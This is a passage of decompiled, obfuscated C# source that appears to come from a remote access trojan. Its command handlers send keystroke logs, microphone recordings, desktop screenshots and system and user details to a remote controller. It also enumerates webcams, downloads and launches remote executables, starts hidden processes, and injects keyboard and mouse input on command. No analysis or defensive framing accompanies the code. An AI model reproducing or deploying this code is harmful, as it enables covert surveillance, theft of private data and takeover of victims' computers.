				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					method_0();
					lwTyp9d68gwn480.WriteLine("/ERROR/");
					lwTyp9d68gwn480.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void wWWGTxp8ChlIm174(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
				string text = array.GetValue(1)!.ToString();
				string text2 = array.GetValue(0)!.ToString();
				if (!Directory.Exists(text2))
				{
					Directory.CreateDirectory(text2);
				}
				string[] array2 = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(array.GetValue(2), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array3 = new byte[array2.GetUpperBound(0) + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array3[i] = Conversions.ToByte(array2.GetValue(i));
				}
				if (array2.Length < 32768)
				{
					rDy98HXCRIkIZ46 = text2 + text;
					if (File.Exists(rDy98HXCRIkIZ46))
					{
						GmhWc9n87GxDM122(1);
						try
						{
							File.Delete(rDy98HXCRIkIZ46);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							try
							{
								GmhWc9n87GxDM122(1);
								fileStream_0.Flush();
								fileStream_0.Close();
								uzXUQX0YRANWb41.Close();
								File.Delete(rDy98HXCRIkIZ46);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								try
								{
									GmhWc9n87GxDM122(1);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									File.Delete(rDy98HXCRIkIZ46);
									ProjectData.ClearProjectError();
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					fileStream_0 = new FileStream(rDy98HXCRIkIZ46, FileMode.CreateNew);
					uzXUQX0YRANWb41 = new BinaryWriter(fileStream_0);
					byte_0 = new byte[array2.Length - 1 + 1];
					byte_0 = array3;
					uzXUQX0YRANWb41.Write(byte_0);
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
					return;
				}
				rDy98HXCRIkIZ46 = text2 + text;
				if (File.Exists(rDy98HXCRIkIZ46))
				{
					GmhWc9n87GxDM122(1);
					try
					{
						File.Delete(rDy98HXCRIkIZ46);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							GmhWc9n87GxDM122(1);
							fileStream_0.Flush();
							fileStream_0.Close();
							uzXUQX0YRANWb41.Close();
							File.Delete(rDy98HXCRIkIZ46);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								GmhWc9n87GxDM122(1);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								File.Delete(rDy98HXCRIkIZ46);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
				fileStream_0 = new FileStream(rDy98HXCRIkIZ46, FileMode.CreateNew);
				uzXUQX0YRANWb41 = new BinaryWriter(fileStream_0);
				byte_0 = new byte[array2.Length - 1 + 1];
				byte_0 = array3;
				uzXUQX0YRANWb41.Write(byte_0);
				fileStream_0.Flush();
				lwTyp9d68gwn480.WriteLine("/ANOTHEPK/");
				lwTyp9d68gwn480.Flush();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
					lwTyp9d68gwn480.WriteLine("/ERRORUPL/");
					lwTyp9d68gwn480.Flush();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void R6k7xrEiKWVYI175(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array2 = new byte[array.GetUpperBound(0) + 1];
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = Conversions.ToByte(array.GetValue(i));
				}
				byte_0 = new byte[array.Length - 1 + 1];
				byte_0 = array2;
				uzXUQX0YRANWb41.Write(byte_0);
				fileStream_0.Flush();
				lwTyp9d68gwn480.WriteLine("/ANOTHEPK/");
				lwTyp9d68gwn480.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
					lwTyp9d68gwn480.WriteLine("/ERRORUPL/");
					lwTyp9d68gwn480.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void t6BT18E5ameIM176(object Tempdata)
	{
		checked
		{
			try
			{
				if (Operators.ConditionalCompareObjectNotEqual(Tempdata, (object)"", false))
				{
					string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
					byte[] array2 = new byte[array.GetUpperBound(0) + 1];
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array2[i] = Conversions.ToByte(array.GetValue(i));
					}
					byte_0 = new byte[array.Length - 1 + 1];
					byte_0 = array2;
					uzXUQX0YRANWb41.Write(byte_0);
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
				}
				else
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					fileStream_0.Flush();
					fileStream_0.Close();
					uzXUQX0YRANWb41.Close();
					lwTyp9d68gwn480.WriteLine("/ERRORUPL/");
					lwTyp9d68gwn480.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetMessageExtraInfo();

	private void AJ9MZ1Hb3jwJg178(object Tempdata)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"right", false))
			{
				mouse_event(8, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(16, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"left", false))
			{
				mouse_event(2, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(4, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"middle", false))
			{
				mouse_event(32, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(64, 0, 0, 0, (int)GetMessageExtraInfo());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void d4gHJ5oLU73Bb179(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { '*' }, (string[])null, (Type[])null, (bool[])null);
				int x = (int)Math.Round(Math.Floor(double.Parse(array[0])));
				int y = (int)Math.Round(Math.Floor(double.Parse(array[1])));
				ref Point reference = ref point_0;
				reference = new Point(x, y);
				Cursor.set_Position(point_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void PBbvQAmvxUWnm180()
	{
		try
		{
			if (jUXDTAE81gVwy12)
			{
				string lpstrCommand = "open new type waveaudio alias capture";
				string lpstrReturnString = null;
				mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
				lpstrReturnString = "set capture samplespersec 6000 channels 8 bitspersample 1 alignment 1 bytespersec 6000";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "record capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				GmhWc9n87GxDM122(5);
				lpstrReturnString = "save capture test.wav";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "close capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				try
				{
					XlhPz2rTPpQC970.WriteLine("/SOUNDREC/" + Convert.ToBase64String(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().ReadAllBytes("test.wav")));
					XlhPz2rTPpQC970.Flush();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteFile(Application.get_StartupPath() + "\\test.wav");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void d1AseIpuSifgv181(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			if (!Directory.Exists(array.GetValue(0)!.ToString()))
			{
				Directory.CreateDirectory(array.GetValue(0)!.ToString());
			}
			if (!File.Exists(array.GetValue(0)!.ToString() + text))
			{
				string text2 = array.GetValue(2)!.ToString();
				((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Network().DownloadFile(text2, array.GetValue(0)!.ToString() + text, (string)null, (string)null, false, 100000, true);
				GmhWc9n87GxDM122(5);
			}
			int num = 0;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.StartsWith("winupdate"))
				{
					num = 1;
				}
			}
			if (num == 0)
			{
				Process.Start(array.GetValue(0)!.ToString() + text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void V8KGC6aNb60ys182(object Tempdata)
	{
		try
		{
			SendKeys.SendWait(Conversions.ToString(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void VmKG9kjnSnarT183()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		try
		{
			H0UldpsVnipgP57 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = H0UldpsVnipgP57.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object current = enumerator.get_Current();
					hViJd5ZwYbOWr58 = NewLateBinding.LateIndexGet(current, new object[1] { "manufacturer" }, (string[])null).ToString();
					string_2 = NewLateBinding.LateIndexGet(current, new object[1] { "model" }, (string[])null).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = null;
			text = "/INFOPCPC/";
			text = text + "Computer Name = " + ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Name() + "±";
			text = text + "Computer Manufacturer = " + Manufacturer + "±";
			text = text + "Computer Model = " + Model + "±";
			text = text + "OS Name = " + ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_OSFullName() + "±";
			text = text + "OS Version = " + ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_OSVersion() + "±";
			text = text + "System Type = " + ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_OSPlatform() + "±";
			text = text + "Total Physical Memory = " + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_TotalPhysicalMemory()) + "±";
			text = text + "Total Virtual Memory = " + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_TotalVirtualMemory()) + "±";
			text = text + "Available Physical Memory = " + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_AvailablePhysicalMemory()) + "±";
			text = text + "Available Virtual Memory = " + Conversions.ToString(((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Info().get_AvailableVirtualMemory()) + "±";
			text = text + "Username = " + a6hS23aOog55kaNfGMvgWg2.User.get_Name() + "±";
			text = text + "System Directory = " + Environment.SystemDirectory;
			ALe9zZxthFoud85.WriteLine(text);
			ALe9zZxthFoud85.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void kcHWiVfkFdKQi184(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "logdll.txt", "", false);
				return;
			}
			string text = ((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "logdll.txt");
			if (text.Length > 2000000)
			{
				text = q07QX2zPwPcMi112("Log file too big", "&%#@?,:*");
				streamWriter_3.WriteLine("/KEYSLOGG/" + text);
				streamWriter_3.Flush();
			}
			else
			{
				text = q07QX2zPwPcMi112(text, "&%#@?,:*");
				streamWriter_3.WriteLine("/KEYSLOGG/" + text);
				streamWriter_3.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Qcy1UAULM2Jc9185(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				string lpstrCommand = "Set CDaudio door open";
				mciExecute(ref lpstrCommand);
			}
			else
			{
				string lpstrCommand = "Set CDaudio door closed";
				mciExecute(ref lpstrCommand);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void VW82LAfILX6fO186(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void zw7xaXK90jcDr188(object Tempdata)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			string text = null;
			EncoderParameters val = new EncoderParameters(1);
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
			ImageCodecInfo val2 = EqCed4lNA73fI106("image/jpeg");
			int num = int.Parse(array[1]);
			int num2 = 0;
			Bitmap val3 = new Bitmap(bCba0fBw801IW53.Width, bCba0fBw801IW53.Height, (PixelFormat)135173);
			if (bCba0fBw801IW53.Width < num)
			{
				num = bCba0fBw801IW53.Width;
			}
			switch (num)
			{
			case 1280:
				num2 = 1024;
				break;
			case 1024:
				num2 = 768;
				break;
			case 800:
				num2 = 600;
				break;
			case 640:
				num2 = 480;
				break;
			case 320:
				num2 = 240;
				break;
			}
			Bitmap val4 = new Bitmap(num, num2, (PixelFormat)135173);
			Graphics val5 = Graphics.FromImage((Image)(object)val3);
			val5.CopyFromScreen(bCba0fBw801IW53.X, bCba0fBw801IW53.Y, 0, 0, bCba0fBw801IW53.Size, (CopyPixelOperation)13369376);
			val5 = Graphics.FromImage((Image)(object)val4);
			val5.set_InterpolationMode((InterpolationMode)7);
			val5.set_CompositingQuality((CompositingQuality)2);
			val5.DrawImage((Image)(object)val3, 0, 0, num, num2);
			MemoryStream memoryStream = new MemoryStream();
			if (Conversions.ToDouble(array[0]) > 75.0)
			{
				((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			}
			else
			{
				((Image)val4).Save((Stream)memoryStream, val2, val);
			}
			memoryStream.Capacity = checked((int)memoryStream.Length);
			byte[] buffer = memoryStream.GetBuffer();
			text = Convert.ToBase64String(buffer);
			_ = text.Length;
			((Image)val3).Dispose();
			((Image)val4).Dispose();
			memoryStream.Dispose();
			memoryStream.Close();
			val5.Dispose();
			buffer = null;
			XlhPz2rTPpQC970.WriteLine("/STARDESK/" + text);
			XlhPz2rTPpQC970.Flush();
			text = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10(object Tempdata)
	{
		try
		{
			int processId = int.Parse(Conversions.ToString(Tempdata));
			Process processById = Process.GetProcessById(processId);
			try
			{
				if (processById != null)
				{
					processById.Kill();
					Eew8M9Oujs135.WriteLine("/REFRESHP/");
					Eew8M9Oujs135.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process.EnterDebugMode();
					processById.Kill();
					Process.LeaveDebugMode();
					Eew8M9Oujs135.WriteLine("/REFRESHP/");
					Eew8M9Oujs135.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void JmiqPjbi0IAeN190(object Tempdata)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool method_11(string addrrr)
	{
		bool flag = false;
		try
		{
			string pattern = "^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
			Regex regex = new Regex(pattern);
			flag = Operators.CompareString(addrrr, "", false) != 0 && regex.IsMatch(addrrr, 0);
			return flag;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = flag;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void m4n3Tu0idoQzu192()
	{
		string text = null;
		try
		{
			while (cwnijYuqInCBg68.Connected)
			{
				text = yJvlQpRpK8NC271.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/DOWNDESK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread7 = new Thread(zw7xaXK90jcDr188);
						thread7.Start(text);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSQL/":
					try
					{
						XlhPz2rTPpQC970.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width) + "*" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height));
						XlhPz2rTPpQC970.Flush();
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SENDKEYB/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread6 = new Thread(V8KGC6aNb60ys182);
						thread6.Start(text);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SETMOUSE/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread5 = new Thread(d4gHJ5oLU73Bb179);
					thread5.Start(text);
					break;
				}
				case "/SETCLICK/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread4 = new Thread(AJ9MZ1Hb3jwJg178);
					thread4.Start(text);
					break;
				}
				case "/STARTSQN/":
					try
					{
						qjMADzRH3jB3L14 = true;
						XlhPz2rTPpQC970.WriteLine("/STARTSQN/");
						XlhPz2rTPpQC970.Flush();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEQ/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(oW4RHdnZiGW7R152);
						thread3.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEF/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(tLpDoi0TcRQ8p153);
						thread2.Start(text);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPPSEQ/":
					try
					{
						qjMADzRH3jB3L14 = false;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPDESK/":
					try
					{
						qjMADzRH3jB3L14 = false;
						XlhPz2rTPpQC970.Dispose();
						yJvlQpRpK8NC271.Dispose();
						LgZOJZJe2zxSr69.Dispose();
						cwnijYuqInCBg68.Close();
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDREC/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						jUXDTAE81gVwy12 = true;
						Thread thread = new Thread(PBbvQAmvxUWnm180);
						thread.Start();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDSTP/":
					try
					{
						jUXDTAE81gVwy12 = false;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					try
					{
						XlhPz2rTPpQC970.WriteLine("/STARDESK/");
						XlhPz2rTPpQC970.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void Sr98SZQrihqrE193()
	{
		string text = null;
		checked
		{
			try
			{
				while (zamWR8cArZJGJ73.Connected)
				{
					text = Eps8uuudGpOOV76.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						GmhWc9n87GxDM122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/WEBLISTC/":
						try
						{
							string lpszName = Strings.Space(100);
							string lpszVer = Strings.Space(100);
							int num = 0;
							StringBuilder stringBuilder = new StringBuilder();
							bool flag;
							do
							{
								if (flag = capGetDriverDescriptionA((short)num, ref lpszName, 100, ref lpszVer, 100))
								{
									stringBuilder.Append(lpszName.Trim() + "¦");
								}
								num++;
							}
							while (flag);
							streamWriter_0.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
							streamWriter_0.Flush();
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTART/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							YysOhyszktc7C20 = "Connect";
							cVmg7dsMJLhd622 = "";
							wFTsaYy8sx164 = new Thread(dXd95YpQMBV4s147);
							wFTsaYy8sx164.Start(text);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBIMAGA/":
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						string text2 = text;
						if (Operators.CompareString(text2, "0", false) == 0)
						{
							bool_0 = true;
						}
						else if (Operators.CompareString(text2, "1", false) == 0)
						{
							dVlYSzeBNH167 = true;
						}
						break;
					}
					case "/WEBIMAGE/":
						try
						{
							switch (Strings.Mid(text, 11, Strings.Len(text)))
							{
							case "Image":
								E7TjgcDz0FegX21 = "Image";
								break;
							case "Capture":
								E7TjgcDz0FegX21 = "Capture";
								break;
							case "Capture2":
								E7TjgcDz0FegX21 = "Capture2";
								break;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBSTOPP/":
						try
						{
							bool_0 = false;
							dVlYSzeBNH167 = false;
							E7TjgcDz0FegX21 = "";
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/WEBDISCO/":
						try
						{
							bool_0 = false;
							dVlYSzeBNH167 = false;
							E7TjgcDz0FegX21 = null;
							cVmg7dsMJLhd622 = "Disconnect";
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDESK/":
						try
						{
							bool_0 = false;
							dVlYSzeBNH167 = false;
							E7TjgcDz0FegX21 = null;
							cVmg7dsMJLhd622 = "Disconnect";
							streamWriter_0.Dispose();
							Eps8uuudGpOOV76.Dispose();
							networkStream_0.Dispose();
							zamWR8cArZJGJ73.Close();
							return;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						GmhWc9n87GxDM122(1);
						try
						{
							streamWriter_0.WriteLine("/WEBLISTC/");
							streamWriter_0.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ITaS710XX6UWO194()
	{
		string text = null;
		checked
		{
			try
			{
				while (mdHjk0nUPN4ks78.Connected)
				{
					text = Oq0PRcMKw79Mc81.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						GmhWc9n87GxDM122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text4 = null;
								if (val2 != null)
								{
									double num2 = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num3 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num3), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num2), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text4 = Convert.ToBase64String(buffer);
									lwTyp9d68gwn480.WriteLine("/IPREVIEW/" + text4);
									lwTyp9d68gwn480.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError13)
							{
								ProjectData.SetProjectError(projectError13);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError14)
						{
							ProjectData.SetProjectError(projectError14);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPDOWN/":
						try
						{
							method_0();
						}
						catch (Exception projectError12)
						{
							ProjectData.SetProjectError(projectError12);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread10 = new Thread(wwuNlBCB5CqYd163);
							thread10.Start(lwTyp9d68gwn480);
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread9 = new Thread(zaM5nRiS8bBoF164);
							thread9.Start(text);
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							lwTyp9d68gwn480.WriteLine("/ERRORDIR/");
							lwTyp9d68gwn480.Flush();
							ProjectData.ClearProjectError();
						}
						break;
